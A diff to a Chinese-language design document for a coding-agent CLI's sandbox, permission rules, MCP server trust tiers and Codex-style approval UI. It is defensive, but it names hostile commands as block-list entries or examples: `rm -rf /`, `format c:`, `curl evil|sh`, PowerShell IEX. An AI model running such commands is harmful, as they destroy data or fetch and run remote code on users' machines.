@@ -50,7 +50,7 @@
 |----|------|------|----------|
 | L0 意图 | `sandbox/filters.py::IntentFilter` | 硬红线(`rm -rf /`/`format c:`)、数据外泄、远程执行 → deny-critical/high | 模型无关、确定性最强 |
 | L1 信任 | `sandbox/filters.py::TrustFilter` | 工作区信任分级(trusted/limited/untrusted/unknown) + 域名白名单 + 计划模式 | trusted 放行 / untrusted 拒 / unknown 确认 |
-| L2 资源 | `sandbox/filters.py::ResourceFilter` | 默认禁网 → 无网隔离；高危写 → 副本模式 | 决定"上不上 L3" |
+| L2 资源 | `sandbox/filters.py::ResourceFilter` | **可选**禁网开关 (`sandbox.resource.deny_network_by_default`，默认**关闭**)；高危写 → 副本模式 | 决定"上不上 L3" |
 | L3 强隔离 | `sandbox/filters.py::HardIsolationFilter` | 后端自动选择；需强隔离但无强后端 → **fail-closed 拒绝** | 真正的容器/OS 隔离 |
 
 **隔离后端自动选择**（强度降序探测）：`landlock → docker → seatbelt → token-acl → jobobject → local`。
@@ -87,7 +87,7 @@
 ### 5.1 网络出口（权威判定 = `NetworkGuard.check`）
 - **L0 意图滤网**：消费 `guard.check().action == "deny"`（外泄/远程执行/敏感域名/端口扫描/CIDR 越界）→ 沙箱 deny high。**不负责**白名单强制。
 - **L1 信任滤网**：负责**域名白名单强制**（`payload.meta.allowed_domains` ← `sandbox.allowed_domains` / `permissions.network.allow_domains`）。
-- **L2 资源滤网**：负责**存在性 + 无网开关**：含网络请求且默认禁网 → `network=False + isolate=True`（气隙执行）。本地命令不受影响。
+- **L2 资源滤网**：负责**存在性 + 无网开关**：检测到网络请求且 `deny_network_by_default` 开启 → `network=False + isolate=True`（气隙执行）。**该开关默认关闭**，即开箱不禁用出网；生产配置见 `SECURITY_BASELINE.md`。网络探测自身异常时按「存在网络请求」处理（fail-closed）。本地命令不受影响。
 
 > 一致性契约：被 `NetworkGuard` 判 deny 的命令，沙箱 L0 必须 deny 且严重度一致（high）。
 
@@ -128,18 +128,300 @@
 
 ## 8. 增强路线图（按价值排序）
 
-| # | 模块 | 增强方向 |
-|---|------|----------|
-| E1 | `tools/mcp/policy.py` + `security.py` | MCP **server 信任分级**：把每台 server 的权限域(只读/工具白名单/允许的域名)落到持久化策略；新增"调用前工具级授权 + 会话内可回撤"，取代散落的临时确认 |
-| E2 | `core/workspace_trust.py` | 信任**自动衰减与重校验**：trusted 在目录变更/新敏感文件(.env/.git/config/密钥)出现时自动降级到 limited 并提示复议 |
-| E3 | `sandbox/backends.py` + `arch/platform.py` | **Job Object 资源配额落地**：CPU 配额、内存上限、进程树击杀超时兜底(当前仅存在性探测) |
-| E4 | `core/security_auditor.py` + `harden/audit_export.py` | 审计**关联合并 + 跨会话异常检测**：同源多次红线(如 MCP 反复注入)聚合告警；导出支持轮转与加密 |
-| E5 | `core/tool_executor.py` | **写操作风暴检测**：单会话内高频率写/删除触发节流与告警，防误删批量任务 |
-| E6 | `tools/permissions.py` | `permissions.rules` 增强：**负向 glob**(`!bin/**`)、MCP 工具名规则、会话内临时授权提升 |
-| E7 | `sandbox/isolation.py` | 副本模式的 **diff 可视化确认**：以 CLI/交互卡片展示变更后再 apply |
-| E8 | `config` | `sandbox`/`permissions` 配置的 **schema 强校验 + fail-closed 可观测性**（开启项/降级项可视化） |
+| # | 模块 | 增强方向 | 状态 |
+|---|------|----------|------|
+| E1 | `tools/mcp/policy.py` + `security.py` | MCP **server 信任分级**：把每台 server 的权限域(只读/工具白名单/允许的域名)落到持久化策略；新增"调用前工具级授权 + 会话内可回撤"，取代散落的临时确认 | ✅ 已落地 |
+| E2 | `core/workspace_trust.py` | 信任**自动衰减与重校验**：trusted 在目录变更/新敏感文件(.env/.git/config/密钥)出现时自动降级到 limited 并提示复议 | ✅ 已落地 |
+| E3 | `sandbox/backends.py` + `arch/platform.py` | **Job Object 资源配额落地**：CPU 配额、内存上限、进程树击杀超时兜底(当前仅存在性探测) | ✅ 已落地 |
+| E4 | `core/security_auditor.py` + `harden/audit_export.py` | 审计**关联合并 + 跨会话异常检测**：同源多次红线(如 MCP 反复注入)聚合告警；导出支持轮转与加密 | ✅ 部分（关联/轮转已落地，导出加密未做） |
+| E5 | `core/tool_executor.py` | **写操作风暴检测**：单会话内高频率写/删除触发节流与告警，防误删批量任务 | ✅ 已落地 |
+| E6 | `tools/permissions.py` | `permissions.rules` 增强：**负向 glob**(`!bin/**`)、MCP 工具名规则、会话内临时授权提升 | ◐ 部分（前两项已落地） |
+| E7 | `sandbox/isolation.py` + `ui/approval_overlay.py` | 副本模式的 **diff 可视化确认**：以 CLI/交互卡片展示变更后再 apply | ✅ 已落地（后端 + 审批卡片） |
+| E8 | `config` | `sandbox`/`permissions` 配置的 **schema 强校验 + fail-closed 可观测性**（开启项/降级项可视化） | ✅ 已落地 |
 
-> 判定"先做哪些"：优先级高且可独立演进 → **E2、E3、E5**；依赖交互设计 → **E1、E7**；属加固打磨 → **E4、E6、E8**。
+> 判定"先做哪些"：优先级高且可独立演进 → **E2、E3、E5**（已落地）；依赖交互设计 → **E1、E7**（后端 + 审批卡片已落地）；属加固打磨 → **E4、E6、E8**。
+
+**E2 落地说明（2026-11-06）**：此前 `check_for_decay()` / `apply_decay()` 只有单元测试调用，
+CLI (`cli/cmd_chat.py`) 与 Web (`web/server.py::trust_status`) 都直接读 `record.level`，
+衰减逻辑从未在主链路生效。现在 `check_trust()` 自动执行衰减校验并统一 CLI / Web / 沙箱口径：
+
+- 指纹基线：确认 trusted 时采样「顶层目录结构 + 敏感文件 (`.env`/密钥/`.git/config` 等) 的
+  路径、大小、mtime_ns」，写入持久化记录；之后任一变化即降级为 limited 并要求重新确认。
+  扫描限深 4 层 / 限 20000 条目 / 跳过依赖与构建目录，不读文件内容，正常写代码不会误触发。
+- **fail-closed**：扫描失败（目录消失、权限错误、条目超限）不再 `except: pass` 静默放行，
+  而是降级为 limited；老版本无指纹的记录只补建基线，不每次启动误报。
+- `last_used` 由 `check_trust` 自动维护（60 秒节流落盘），修掉「活跃工作区 30 天后被误判过期」。
+- 降级原因 / 时间写入 `TrustRecord`，经 `get_project_info()` 暴露给 Web 与 TUI 提示。
+- 回归：`tests/test_e2_e5_hardening.py`（16 例）。
+
+**E5 落地说明**：`_WriteStormDetector` 已接入 `ToolExecutor`，但「不同文件数」按整个会话累计，
+一旦改过 15 个文件就永久告警、与 60 秒滑动窗口矛盾。现在文件维度与次数维度共用同一窗口，
+告警态随窗口过期复位，并修正了把「写操作次数」误写成「秒数」的文案。
+
+**E6 部分落地说明（2026-11-06）**：`PermissionPolicy.match_rule()` 新增两类能力：
+
+- **负向排除**：规则支持 `exclude: "git push --force*"` 或 `pattern: "!git push --force*"`。
+  目标命中排除模式时该规则不生效，用于给宽泛 allow 开洞，避免「永远允许」成为提权入口。
+  **deny 规则忽略 exclude**（fail-closed：拒绝规则不允许被放宽），优先级仍为 deny > ask > allow。
+- **MCP 工具名规则**：`mcp_call` 按 `mcp__<server>__<tool>` 规范化参与 tool 匹配，
+  可写 `{"tool": "mcp__untrusted__*", "action": "deny"}` 对单台 server 精确管控。
+- 仍待办：会话内临时授权提升（依赖交互设计，未动）。
+- 回归：`tests/test_e6_e8_hardening.py`（21 例）。
+
+**E8 落地说明**：新增 `config/security_schema.py`，把此前完全不在 `config/validate.py`
+校验范围内的 `sandbox` / `permissions` 纳入强校验。最危险的不是配错值而是**静默配错**：
+`match_rule()` 对非 dict 规则 / 未知 action 一律跳过，`sandbox.enabled=false` 直接短路四层滤网。
+现在这些会变成 `tuan config validate` 的显式错误，并由 `tuan harden status` 输出
+「安全配置 schema」段。缺失字段不报错（由 DEFAULT_CONFIG 兜底），只报显式写错或显式关闭关键防线。
+
+**R8 同类异常即放行修复**：`PermissionPolicy._hardening_confirm()` 在安全引擎导入失败时
+`except: pass` 后继续走 YOLO 自动批准 —— 超长命令 / FD 重定向 / PowerShell IEX /
+Docker 守护进程重定向都会在引擎不可用时被静默放行。现改为返回 `confirm` 并标注 fail-closed。
+
+
+
+**E3 落地说明（2026-11-06）**：最值钱的不是"补上 CPU 配额"，而是修掉**降级被误报为已隔离**：
+`SandboxManager._run_syscall()` 旧实现把 `enforced=True` 写死，只要 platform 层不抛异常，
+即使内部已因 libseccomp 缺失 / Job Object 不可用而退化为普通子进程，上层仍认为
+"已 OS 级强隔离执行"并放行。现在 `SyscallResult` 带 `enforced` / `degraded_reason`，
+所有 fallback 路径显式 `enforced=False`，交由 `enforce_required` 决定是否拒绝。
+
+- `arch/platform.py`：新增 `JobObjectLimits` 纯数据层（含范围校验、单位换算）；
+  `_set_job_limits()` 两次 `SetInformationJobObject` —— class 9 落内存/workingset/进程数、
+  class 15 落 CPU 硬上限（`ENABLE|HARD_CAP`，`CpuRate` 单位=百分数×100）。
+  旧实现 `cpu_rate_pct` **完全没被使用**，`MaximumWorkingSetSize` 也缺
+  `JOB_OBJECT_LIMIT_WORKINGSET` flag 而不生效。
+- **fail-closed**：`AssignProcessToJobObject` 失败时旧实现 `pass` 后照跑、却仍返回
+  `mechanism="job-object"`；现在杀掉子进程并返回 `blocked=True / enforced=False`。
+  配额设置任一步失败即抛错，不再"配额没设上却照跑"。
+- 进程树击杀超时兜底：`TerminateJobObject` → `taskkill /T /F` → `proc.kill()` 三级。
+- `backends._jobobject_available()` 从「`sys.platform == "win32"` 就算可用」改为真实
+  `CreateJobObjectW` + `QueryInformationJobObject` 能力探测。
+- 新配置键 `sandbox.resource.cpu_rate_pct / active_process_limit / kill_timeout_seconds`，
+  已纳入 `tuan config validate` 强校验（写错范围执行层会降级, 必须提前拦住）。
+- **边界（如实）**：Job Object 只在 Windows 生效；本环境为 Linux，Windows 路径由
+  fake kernel32 / fake Popen 单测覆盖，**未在真实 Windows 主机上跑过**。Linux/macOS
+  仍须靠外部容器或 VM，`enforced=False` 只是让降级可见，不提供额外隔离。
+
+**E4 落地说明（部分）**：新增 `core/audit_correlation.py`。此前审计是逐条的，
+1000 条 `deny` 只是 1000 行日志，同源反复注入看不出异常。
+
+- `AuditCorrelator` 产出三类聚合告警：`burst`（窗口内同源重复）、`cross_session`
+  （同一指纹出现在 ≥2 个会话，抓跨会话投毒/提示注入复用）、`severity_escalation`
+  （同源从 low 跃升 critical）。指纹不含 session/seq/ts，并归一化掉路径与数字。
+- **纯观测，绝不反作用于裁决**：不改 `AuditRecord`、不返回 allow/deny、异常一律吞掉记 log；
+  告警只推送到**已存在**的全局事件总线（不主动创建以免副作用）。
+- `SecurityAuditor` 启动时从 AEAD 日志 `replay()` 历史，使跨会话检测能跨越进程重启；
+  `recent_alerts()` / `correlation_stats()` / `stats()["correlation"]` 可查。
+- `harden/audit_export.py`：导出支持按大小轮转（`max_bytes` / `backup_count`），
+  文件权限收紧到 0600；`export_file()` 批量重放同样生效。
+- **仍待办**：导出加密。审计主日志本身已 AEAD 加密，但导出到 SIEM 的明文轮转文件
+  需要独立的密钥管理方案，未擅自塞进本轮。
+- 回归：`tests/test_e3_jobobject.py`（25 例）、`tests/test_e4_correlation.py`（24 例）。
+
+
+
+**E1 落地说明（2026-11-06）**：新增 `tools/mcp/policy.py`。此前 `mcp/security.py` 只扫描
+工具描述/参数里的注入文本（内容层），不回答「这台 server 到底被允许做什么」——所有 MCP
+调用只能按外层 `mcp_call` 一刀切放行/拒绝。
+
+- `MCPPolicyStore` 持久化每台 server 的权限域：`tier`（`untrusted`/`limited`/`readonly`/
+  `trusted`）、`read_only`、`tool_allowlist`、`tool_denylist`、`allowed_domains`、
+  `max_calls_per_session`、`require_confirm`，原子写入 `~/.tuan/mcp_server_policy.json`（0600）。
+- **默认 untrusted**：未登记 server 一律拒绝，必须用户显式 `grant()` 后才可用；第一次见到
+  不等于临时放行。`trusted` 档强制要求显式 `tool_allowlist`，拒绝「无白名单 = 全放行」的过宽授权。
+- **deny 优先**、域名白名单（含嵌套参数里的 URL）、会话调用配额、**会话内可回撤**
+  （`revoke_session()` 后立刻重新要求确认，不需重启）。
+- **损坏即拒绝**：策略文件损坏 / 版本不认识时进入 `locked` 状态拒绝所有调用，**不重建为
+  空策略**——空策略看起来像「没有限制」，与「无法验证」的语义正好相反。
+- **接线（关键）**：由 `build_permission_policy()` 注入全局 store，主链路 `mcp_call` 真的经过
+  信任分级；单元测试直接构造 `PermissionPolicy` 时不受影响。策略层初始化失败时注入
+  `_DenyAllMCPPolicy` 而不是 `pass` 回退到裸路径。新配置键 `mcp.policy.enabled`（缺省启用）
+  已纳入 E8 强校验，显式关闭会报「安全降级」。
+- **TUI 卡片已落地**：`request_grant()` 通过 `ui/approval_overlay.py` 呈现完整权限域
+  （tier / allowlist / denylist / domains）并路由显式决策；「仅本会话」走内存临时策略不写盘，
+  「授予并持久化」才调 `grant()`。拒绝 / 中止 / 通道异常一律不改策略。见下方 TUI 外壳借鉴说明。
+
+**E7 落地说明（2026-11-06）**：本轮发现两个比"加个预览"严重得多的问题。
+
+1. **`copy_diff_apply` 是纯文档特性**：L2 滤网在高危时把 `verdict.workspace_mode` 写成
+   `copy_diff_apply` 并进审计 context，但 `SandboxManager.execute_isolated()` **从未读取该字段**，
+   `isolate_workdir` / `diff` / `apply` 在生产代码里零调用点 —— 高危命令实际仍在真实工作区裸跑。
+   现在按 `workspace_mode` 分派，高危命令真的在隔离副本里执行，经预览 + 确认后才写回。
+2. **快照漏扫隐藏目录，确认界面说谎**：`Snapshot.capture()` 用
+   `not d.startswith(".")` 跳过所有点目录，于是副本里改 `.github/workflows/ci.yml` 时
+   `diff()` 返回空 —— 用户看到「无变更」。实测确认后改为只跳过 `_IGNORED` 与隔离副本自身。
+
+- 新增 `DiffPreview` / `DiffEntry`：每条变更带 `path/status/size_before/size_after`、
+  **文本内容前 20 行预览**（用户能看见那一行是不是 `curl evil|sh`，而不只是文件名）、
+  二进制标注、`.env`/私钥/credentials 等敏感文件 `[!敏感]` 高亮；`to_text()` 纯文本渲染
+  可直接 print 或塞进 TUI 卡片。
+- `confirm_apply()` fail-closed 契约：`confirm` 为 None / 抛异常 / 返回非 True → 不写回；
+  **TOCTOU 复检** —— 确认期间副本发生变化则拒绝并要求重新预览。刻意不引入快照缓存，
+  避免「判定依赖文件系统时间点」。
+- `SandboxExecResult` 新增 `workspace_mode` / `applied` / `applied_files` / `diff_preview` /
+  `confirm_reason`；拒绝时把预览一并放进 `error`，保证用户仍能看见本来要改什么；
+  副本在 `finally` 里必定清理。
+- **TUI 卡片已落地**：`confirm_apply()` 接受 `card_renderer`，由
+  `ui/approval_overlay.py` 渲染结构化审批卡片；有 `ctx.confirm` 时交给现有 TUI 挂起式
+  确认通道，无通道时提供 headless 默认通道（打印卡片 + 精确 6 位确认码 + stdin，
+  非 TTY/EOF 即 ABORT）。**行为变更**：上一轮「无 confirm 通道直接失败」的 headless 缺口
+  已补上，但**没有放宽 fail-closed** —— 只是提供了一个同样要求显式决策的通道。
+- **边界（如实）**：TUI 复用的是现有 `confirm()` 文本框渲染通道，**没有**把
+  prompt_toolkit 应用整体换成 ratatui 式 Widget/Buffer 架构（理由见下方借鉴说明）；
+  TUI 路径走 y/n（`_resolve_confirm`），不显示确认码提示，卡片文案与通道行为一致，
+  不出现「写着要输码、实际按 y 就放行」。`copy_diff_apply` 与 OS 强后端叠加时后端在副本
+  cwd 内执行，未对 Windows Job Object 做真机验证（同 E3 边界）。
+- 回归：`tests/test_e1_e7_hardening.py`（39 例）、`tests/test_tui_approval_overlay.py`（59 例）。
+
+
+
+**TUI 外壳借鉴说明（Codex CLI，2026-11-06）**：按需求把 `openai/codex` 的 TUI 源码
+**完整下载到本地核查**（`codex-rs/tui/`，Rust + ratatui + crossterm + tokio，
+**165 个顶层模块、1216 个 `.rs` 文件、492414 行**（另跳过 1491 个快照文件），
+  并**完整照抄**其 `LICENSE` 与 `NOTICE` 原文到
+`THIRD_PARTY_LICENSES/`（Apache-2.0 第 4 条与上游 NOTICE 的归属要求）。
+
+**但 TUI 源码没有逐字复制，本项目也不宣称做了逐字复制。** 两个硬理由：
+
+1. **跨语言不可行**：上游 `codex-tui` 是独立 Rust crate，渲染建立在 ratatui 的
+   `Widget`/`Buffer` trait 与 crossterm 事件循环上；Tuan-CLI 是纯 Python +
+   prompt_toolkit/rich。逐字搬 49.2 万行 Rust 进 Python 仓库没有可执行语义。
+2. **整体替换 TUI 外壳会重新打开侧门**：权限策略注入（`build_permission_policy`）、
+   确认通道（`ctx.confirm`）、沙箱路由（`_route_sandbox_isolation`）都挂在现有 TUI
+   入口上。换壳等于把 E1–E8 修好的接线全部甩掉 —— 这正是前几轮反复在堵的问题。
+
+因此采取**等价移植交互外壳**：把上游 `bottom_pane/approval_overlay.rs` 的组件分层
+（`ApprovalRequest` → 选项列表 → 显式决策事件 → 路由）与四条交互契约，
+用 Python 独立实现并**内联**到 `tuan_cli/ui/approval_overlay.py`；卡片排版沿用
+Tuan 现有 `_render_confirm_card` / `_render_ask_card` 的盒子渲染器，不引入 ratatui。
+
+借鉴的四条契约（均已在代码中落地并有回归覆盖）：
+1. **选择总是发出显式决策事件** —— 没有「没输入 = 同意」；
+2. **Esc / 取消永远映射 Cancel/Abort** —— 上游对 MCP elicitation 特别保证「关闭对话框
+   不会静默变成 continue without info」，这里 ABORT 优先于确认码校验；
+3. **UI 层不判定安全性** —— 上游原文 "This module does not evaluate whether an
+   action is safe to run; it only presents choices and routes user decisions."；
+   安全裁决仍由 E1 策略库与 E7 `confirm_apply` 负责；
+4. **作用域区分**（`Accept` / `AcceptForSession`）→ `ONCE` / `SESSION`。
+
+相对上游的修改也如实记录：请求模型改为 Python dataclass；决策解析 fail-closed
+（未知输入 RETRY、错码 DENY、非 TTY headless 用 6 位确认码、stdin 不可用 ABORT）；
+新增 E1 持久化信任授予流程与 E7 结构化 DiffPreview 卡片（上游均无对应物）。
+归属、许可全文与「OpenAI 不背书」声明见 `NOTICE` 第 9 条。
+
+
+
+**TUI 对齐矩阵（2026-11-06，第 10 轮）**：目标「TUI 与 Codex 完全相同但保留本地化」
+已拆成可度量条目，见 `TUI_PARITY.md` 与 `tuan tui parity`。
+
+- 新增 `tuan_cli/tui/parity/`：`upstream_spec.py`（165 模块树 / 布局常量 /
+  键位规格规范化）、`keymap.py`（8 context / 82 动作 / 74 已绑定的 Codex
+  `built_in_defaults` + `RuntimeKeymap` 解析：context→global→defaults 优先级、
+  显式解绑、唯一性冲突、保留键 `ctrl-c`）、`i18n.py`（17 条文案 → 10 语言，
+  en / zh-CN 全量）、`matrix.py`（逐模块状态与差距队列）。
+- **键位改为 Codex 原生**：`y` 批准 / `a` 本会话 / `p` 前缀 / `d` 拒绝 /
+  `n` 拒绝并说明 / `c` 中止；新增 `PREFIX` / `DECLINE` 决策。上一轮的
+  `s` / `1` / `2` 等保留为本地化兼容别名。`Esc` 仍为 `ABORT`（比上游 exec
+  模式的 decline 更严格，`TUI_PARITY.md` §6 如实标注）。
+- **布局常量逐值对齐**：`LIVE_PREFIX_COLS=2` / `MAX_POPUP_ROWS=8` /
+  `MIN_LIST_WIDTH_FOR_SIDE=40` / `SIDE_CONTENT_GAP=2` /
+  `MENU_SURFACE_HORIZONTAL_INSET=4` / `MAX_KEY_CHORD_STROKES=2`。
+- **口径更正**：完整解压后上游为 165 模块 / 1216 个 `.rs` / 492414 行
+  （跳过 1491 个快照），不是上一轮的 567 / 24.7 万行。所有旧数字引用已修正。
+- **当前指标（不虚报）**：aligned 14、localized 57、not_applicable 63、
+  **pending 31**；宽口径 81.2%、严格对齐 43.0%、**逐值对齐仅 8.5%**；
+  `fully_identical = false`。`tuan tui parity --gaps` 列出 31 个待办模块，
+  `TUI_PARITY.md` §5 给出第 11–15 轮清零路线。**不靠改状态定义凑数。**
+- **本地化边界**：键位 / 布局 / 组件树 / 交互契约不改（这就是「完全相同」的
+  锚点）；只改文案、模型、路径、配色、渲染后端与审批作用域语义。
+- 回归：`tests/test_tui_parity.py`（新增）+ 既有 `test_tui_approval_overlay.py`
+  / `test_e1_e7_hardening.py` 已适配 Codex 键位，102 例通过。
+- 归属：`NOTICE` 第 10 条、`TUI_PARITY.md` §8；**仍未逐字复制任何 Rust 源码**。
+
+**输入/终端能力对齐层（2026-11-06，第 11 轮）**：`input_keymap` 组 7 个待办
+模块全部清零，`tuan tui parity` 指标更新为 aligned 21 / localized 57 /
+n/a 63 / **pending 24**，宽口径 85.5%、严格 47.3%、**逐值对齐 12.7%**，
+`fully_identical` 仍为 `false`（如实）。
+
+- 新增 `tuan_cli/tui/inputkit/`（纯 Python，零 Rust 源码）：`vim_search`
+  （字面匹配 + 完整 grapheme）、`activation_key_guard`（1s 双窗口 +
+  Press/Repeat/Release 状态机）、`copy_input_guard`（RAII 释放，
+  **异常路径也释放**）、`custom_terminal`（双缓冲 diff / 行尾单条
+  `ClearToEnd` / `AlwaysUpdate` 保留 / 宽字符跨界 / BSU-ESU 同步帧 /
+  Drop 恢复光标）、`terminal_program_status`（OSC 7501/21337、VTE 5400
+  阈值、去重缓存、`;`/`\` 转义）、`terminal_hyperlinks`（8192 字节上限、
+  17 项扩展名白名单、canonicalize 逃逸校验、symlink 拒绝、图片魔数
+  探测、OSC 8 不影响几何）、`terminal_visualization_instructions`
+  （feature gate + 中文常量，ASCII-only 约束不变）。
+- **安全增强（比上游更严格，不是放宽）**：`web()` 增加 http/https
+  scheme 白名单与 OSC/BEL 控制字符拦截（上游 `web()` 不校验目的地）；
+  终端状态默认 **no-op writer**，未显式 `configure()` 绝不写转义序列；
+  detail 先剥离控制字符并限长再转义；工作区文件校验对 symlink 祖先
+  fail-closed。这补的是「终端解释 OSC 序列」这条攻击面。
+- **许可特别说明**：`custom_terminal.rs` 上游明确标注派生自
+  `ratatui::Terminal`、采用 **MIT**（Florian Dehau / The Ratatui
+  Developers）。`NOTICE` 第 11 条与 `TUI_PARITY.md` §8 记录双重归属，
+  MIT 全文在 `THIRD_PARTY_LICENSES/Codex-NOTICE.txt`。
+- **本地化如实标注**：grapheme 分段用 stdlib `unicodedata` 的 UAX #29
+  **近似**实现，不声称与 Rust `unicode-segmentation` 逐字节一致；kitty /
+  sixel 图片协议不实现（属 `not_applicable`），字段保留为空不谎称支持。
+- 回归：`tests/test_tui_input_layer.py` **88 例**通过；上一轮
+  `test_tui_parity.py` 指标断言同步到 24 / 85.5% / 47.3% / 12.7%，
+  并新增派生一致性校验（防以后改状态定义凑数）。
+- 下一轮：`core_app` 组 9 个（`app_event` / `chatwidget` 状态机与事件路由），
+  **保留现有权限策略注入与沙箱接线**。
+
+**应用核心对齐层（2026-11-07，第 12 轮）**：`core_app` 组 9 个待办全部清零，
+`tuan tui parity` 指标更新为 aligned 30 / localized 57 / n/a 63 /
+**pending 15**，宽口径 90.9%、严格 52.7%、**逐值对齐 18.2%**，
+`fully_identical` 仍为 `false`（如实）。
+
+- 新增 `tuan_cli/tui/corekit/`（纯 Python，零 Rust 源码复制）9 个模块：
+  `app`（32768 通道容量 / AppRunControl / ExitReason / 可恢复判定）、
+  `app_backtrack`（六步 Esc/Enter 状态机 / `base_id` 变更失效）、
+  `app_command`（Redacted newtype / 命令类型化 / proof 不进录制）、
+  `app_event`（类型化事件 / Ops 不双记 / 分类枚举）、
+  `app_event_sender`（voice_only 白名单 / 吞错记日志 / 10 个便捷方法）、
+  `app_info`（wire→domain 显式转换 / 15·6·11·1·3 字段）、
+  `chatwidget`（committed + active cell / live tail 缓存 / 双生命周期 busy）、
+  `cli`（公开/内部 flag 分离 / 两条审批冲突）、
+  `resize_reflow_cap`（1000·9001·3500·10000 四档 / 三态 / VSCode probe 优先）。
+- **三条最值钱的安全契约**：
+  1. **脱敏 newtype**：上游把 ICE 凭据与语音文本排除在诊断/会话录制外
+     （Debug / Serialize 恒 `<redacted>`，明文只在信令边界还原）。本地化
+     更严：`repr` / `str` / f-string / `to_dict` / `==` 全脱敏，
+     `reveal()` 是唯一出口且带调用计数。
+  2. **审批冲突 fail-closed**：`mark_tui_args` 让「危险绕过审批与沙箱」
+     与 `approval_policy`、`auto_review` 与 `approval_policy` 互斥。若
+     静默共存就是「以为设了审批策略、实际被绕过开关吃掉」的配置侧门。
+     本轮做成结构化拒绝，并接入 `corekit_validate()`。
+  3. **既有安全接线保护**（用户明确要求）：`app.assert_wiring_intact()`
+     真实 import 现有模块，逐项验证 6 条 —— `build_permission_policy`
+     注入、`_DenyAllMCPPolicy` 返回 deny、`ctx.confirm` 通道、
+     `make_confirm_callable` 卡片接线、`confirm_apply` 副本确认、
+     `ABORT` 显式决策（无输入 / Esc 绝不变成同意）。它接入
+     `corekit_validate()` / `parity_validate()` / 回归集，**任何为对齐而
+     重写入口的改动会先被测试拦下**。本轮**没有替换任何现有运行时对象**。
+- 另外两条正确性修复点：`bind_thread()` 在线程变化时强制作废旧选择、
+  `confirm_revert()` 二次校验线程（防 A 会话的 revert 落到 B 会话）；
+  chatwidget 的 `agent_turn_running` 与 `mcp_startup_status` 两个独立
+  生命周期派生单一 busy 指示器（防 MCP 启动期间误报空闲导致重复提交）。
+- **本地化安全增强（比上游更严格）**：有界事件队列（满则拒绝计数）、
+  未知事件名不进 inbound 日志、`app_info` 严格字段白名单 + http/https
+  URL 校验、空 thread_id 的 `SubmitThreadOp` 直接拒绝、非法重排上限
+  fail-closed 回退保守 fallback。
+- **如实边界**：OpenAI 专属（实时语音、云提交、连接器、插件、daemon、
+  worktree）标 `not_applicable` / 未实现，仅保留变体名供白名单契约核验；
+  `MAX_REPLAY_TRANSCRIPT_CELLS` 的上游依赖常量本地不存在，fallback
+  取显式本地默认 1000、`MAX_PENDING_TRANSCRIPT_CELLS=8`，均非逐值复制。
+- 回归：`tests/test_tui_core_app_layer.py` **76 例**通过；
+  `test_tui_parity.py` 指标同步到 15 / 90.9% / 52.7% / 18.2%，派生
+  一致性校验保留。
+- 下一轮：`config_models` + `misc`（5）与 `streaming_async` +
+  `tools_exec` + `history_transcript`（5），仍**保留现有安全接线**。
+
+
 
 ---
 
